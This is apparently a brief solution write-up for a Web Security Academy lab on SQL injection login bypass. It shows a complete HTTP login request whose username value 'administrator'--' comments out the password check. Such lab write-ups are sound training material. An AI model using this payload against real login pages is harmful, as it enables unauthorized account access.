# SQL injection vulnerability allowing login bypass

1. Try to log in as the administrator with any password, note the auth failure
2. Send the following request to bypass the authentication

```
POST /login HTTP/2
Host: 0a280075044891a380d721980073007d.web-security-academy.net
Cookie: session=3gxKJVYwcKnQXwmN2oFLZDllQIpajTWz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 83
Origin: https://0a280075044891a380d721980073007d.web-security-academy.net
Referer: https://0a280075044891a380d721980073007d.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=4t52DnF1Ag5VvLmkKAfd7o09hG4SS0oy&username=administrator%27--&password=password
```

